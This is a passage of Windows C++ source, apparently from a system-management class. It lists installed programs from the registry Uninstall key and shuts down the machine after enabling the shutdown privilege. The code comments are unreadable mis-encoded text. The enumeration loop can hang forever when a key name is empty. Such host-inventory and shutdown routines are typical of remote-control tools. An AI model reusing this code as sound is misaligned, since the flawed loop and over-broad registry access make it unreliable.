	DWORD nUninstallLen       = MAX_PATH;
	char szName[MAX_PATH],szDispayName[MAX_PATH],szUninstall[MAX_PATH];
	lRetVal = RegOpenKeyEx(HKEY_LOCAL_MACHINE,szSubKey,0,KEY_ALL_ACCESS,&hKey);         // ��ȡע�����Ϣ
	DWORD nAttribute = REG_BINARY|REG_DWORD|REG_SZ|REG_EXPAND_SZ|REG_MULTI_SZ|REG_NONE; // ��������
	
	// ��ʼö��
	if (ERROR_SUCCESS == lRetVal)
	{
		lRetVal = RegEnumKeyEx(hKey,nIndex,szName,&nNameLen,0,NULL,NULL,0);
		while(lRetVal != ERROR_NO_MORE_ITEMS)
		{
			nIndex++;
			if (lstrcmpi(szName,"") == 0)
				continue;
			wsprintf(szUninstall,"%s\\%s",szSubKey,szName); // �õ�ȫ��
			memset(szDispayName,0,MAX_PATH);
			nDisplayLen = MAX_PATH;
			lRetVal2 = RegOpenKeyEx(HKEY_LOCAL_MACHINE,szUninstall,0,KEY_ALL_ACCESS,&hSubKey); // ����
			if (lRetVal2 == ERROR_SUCCESS)
			{
				RegQueryValueEx(hSubKey,"DisplayName",0,&nAttribute,(LPBYTE)szDispayName,&nDisplayLen);
				if (lstrcmpi(szDispayName,"") != 0)
				{
					dwLength = lstrlen(szDispayName) + 1;
					// ������̫С�������·�����
					if (LocalSize(lpBuffer) < (dwOffset + dwLength))
						lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
					
					memcpy(lpBuffer + dwOffset, szDispayName, dwLength - 1);
					dwOffset += lstrlen(szDispayName) + 1;//����ļ������б�
				}
			}
			
			nNameLen = MAX_PATH;
			memset(szName,0,MAX_PATH);
			lRetVal = RegEnumKeyEx(hKey,nIndex,szName,&nNameLen,0,NULL,NULL,0);
		}
	}
	
	RegCloseKey(hKey);
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	return lpBuffer;	
}

void CSystemManager::ShutdownWindows( DWORD dwReason )
{
	DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
	ExitWindowsEx(dwReason, 0);
	DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);	
}